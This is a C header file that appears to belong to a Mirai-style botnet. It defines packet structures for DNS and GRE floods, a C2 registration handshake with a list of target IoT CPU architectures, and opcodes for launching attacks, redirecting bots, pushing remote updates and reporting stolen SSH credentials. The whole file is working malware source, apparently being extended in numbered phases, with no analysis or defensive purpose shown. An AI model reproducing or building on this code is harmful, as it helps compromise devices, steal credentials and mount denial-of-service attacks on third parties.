#pragma once

#include <stdint.h>

#include "includes.h"

struct dnshdr {
    uint16_t id, opts, qdcount, ancount, nscount, arcount;
};

struct dns_question {
    uint16_t qtype, qclass;
};

struct dns_resource {
    uint16_t type, _class;
    uint32_t ttl;
    uint16_t data_len;
} __attribute__((packed));

struct grehdr {
    uint16_t opts, protocol;
};

#define PROTO_DNS_QTYPE_A       1
#define PROTO_DNS_QCLASS_IP     1

#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

#define PROTO_GRE_TRANS_ETH 0x6558

/* ─── CNC registration handshake (Phase 1) ───────────────────────────
 *
 * v1 (legacy):  magic(4)=0x00000001 | id_len(1) | id(id_len)
 * v2 (current): magic(4)=0x00000002 | ver(1) | arch(1) | id_len(1) | id(id_len)
 *
 * All multi-byte fields in magic are sent big-endian on the wire as four
 * separate bytes (0x00 0x00 0x00 0x02), matching the existing v1 style.
 *
 * CNC: if magic[3]==0x01 → treat as v1 (ver=1, arch=UNKNOWN).
 *      if magic[3]==0x02 → parse ver + arch fields.
 */

#define CNC_REG_MAGIC_V1          0x01
#define CNC_REG_MAGIC_V2          0x02

#define CNC_REG_MAGIC_V1_BYTES    "\x00\x00\x00\x01"
#define CNC_REG_MAGIC_V2_BYTES    "\x00\x00\x00\x02"
#define CNC_REG_MAGIC_LEN         4

#define CNC_ID_MAX_LEN            31

typedef enum {
    BOT_ARCH_UNKNOWN  = 0,
    BOT_ARCH_MIPS     = 1,
    BOT_ARCH_MIPSEL   = 2,
    BOT_ARCH_ARM      = 3,
    BOT_ARCH_ARM5     = 4,
    BOT_ARCH_ARM6     = 5,
    BOT_ARCH_ARM7     = 6,
    BOT_ARCH_X86      = 7,
    BOT_ARCH_X86_64   = 8,
    BOT_ARCH_PPC      = 9,
    BOT_ARCH_SH4      = 10,
    BOT_ARCH_ARC      = 11,
    BOT_ARCH_SDA      = 12,
    BOT_ARCH_MTD      = 13,
} bot_arch_t;

/* ─── CNC command opcodes (Phase 2+) ─────────────────────────────────
 * Wire format: [len:uint16 BE][opcode:uint8][body...]
 *
 * Attacks (opcode 0x00): body is the legacy attack_parse payload
 *   (duration | vector | targets | options).
 *
 * v1 CNC sends attacks without the opcode byte — cnc_dispatch() falls
 * back to attack_parse(buf, len) when the packet is not a command.
 */

#define CNC_OP_ATTACK       0x00
#define CNC_OP_REDIRECT     0x01
#define CNC_OP_UPDATE       0x02
#define CNC_OP_RELOAD       0x03
#define CNC_OP_KILL         0x04
#define CNC_OP_PING         0x05
#define CNC_OP_ACK          0x06
#define CNC_OP_STOP         0x07
#define CNC_OP_REPORT       0x08

#define CNC_OP_CMD_MIN      CNC_OP_REDIRECT
#define CNC_OP_CMD_MAX      CNC_OP_STOP

#define CNC_ACK_OK          0
#define CNC_ACK_FAIL        1

/* Highest attack vector id; used to tell wrapped attacks from legacy. */
#define CNC_MAX_ATTACK_VECTOR  20

/* ─── CMD_REDIRECT body (Phase 3) ───────────────────────────────────
 *   addr_type (1)   CNC_REDIRECT_IPV4 or CNC_REDIRECT_DOMAIN
 *   IPv4:           ipv4 (4, network order) | port (uint16 BE)
 *   Domain:         domain_len (1) | domain (domain_len) | port (uint16 BE)
 */

#define CNC_REDIRECT_IPV4       0
#define CNC_REDIRECT_DOMAIN     1
#define CNC_REDIRECT_DOMAIN_MAX 255

/* ─── CMD_UPDATE body (Phase 4) ─────────────────────────────────────
 *   url_len (1) | url (url_len)
 *   min_version (1)   update only when bot_ver < min_version
 *   force (1)         non-zero skips version check
 *   [hash_len (1) | hash (hash_len)]   optional; SHA256 (32 bytes) verified when present
 */

/* ─── Bot → CNC REPORT (Phase 7b) ───────────────────────────────────
 *   [len:uint16 BE][0x08][type:uint8][data_len:uint8][data...]
 *   type 1 = text (e.g. SSH cred hit). Max 255 bytes payload.
 */

#define CNC_REPORT_TEXT     1
#define CNC_REPORT_MAX      255

/* ─── Bot → CNC ACK (Phase 6) ────────────────────────────────────────
 *   [len:uint16 BE][0x06][ref_opcode:uint8][status:uint8]
 *   status: CNC_ACK_OK or CNC_ACK_FAIL
 */

#define CNC_UPDATE_URL_MAX      255
#define CNC_UPDATE_HASH_SHA256  32
#define CNC_UPDATE_MAX_BYTES    (2 * 1024 * 1024)
